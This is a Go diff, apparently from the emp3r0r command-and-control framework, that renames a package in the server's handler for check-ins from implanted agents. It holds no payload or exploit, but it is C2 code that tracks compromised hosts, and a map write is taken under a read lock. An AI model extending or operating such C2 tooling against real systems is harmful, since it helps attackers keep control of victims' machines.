@@ -8,7 +8,7 @@ import (
 	"strings"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
-	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/def"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/runtime_def"
 	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/internal/logging"
 	"github.com/jm33-m0/emp3r0r/core/internal/util"
@@ -39,9 +39,9 @@ func handleAgentCheckIn(wrt http.ResponseWriter, req *http.Request) {
 	target.From = req.RemoteAddr
 	if !agents.IsAgentExist(&target) {
 		inx := agents.AssignAgentIndex()
-		def.AgentControlMapMutex.RLock()
-		def.AgentControlMap[&target] = &def.AgentControl{Index: inx, Conn: nil}
-		def.AgentControlMapMutex.RUnlock()
+		runtime_def.AgentControlMapMutex.RLock()
+		runtime_def.AgentControlMap[&target] = &runtime_def.AgentControl{Index: inx, Conn: nil}
+		runtime_def.AgentControlMapMutex.RUnlock()
 		shortname := strings.Split(target.Tag, "-agent")[0]
 		if util.IsExist(agents.AgentsJSON) {
 			if l := agents.RefreshAgentLabel(&target); l != "" {
@@ -51,7 +51,7 @@ func handleAgentCheckIn(wrt http.ResponseWriter, req *http.Request) {
 		logging.Printf("Checked in: %s from %s, running %s", strconv.Quote(shortname), fmt.Sprintf("'%s - %s'", target.From, target.Transport), strconv.Quote(target.OS))
 		agents.ListConnectedAgents()
 	} else {
-		for a := range def.AgentControlMap {
+		for a := range runtime_def.AgentControlMap {
 			if a.Tag == target.Tag {
 				a = &target
 				break
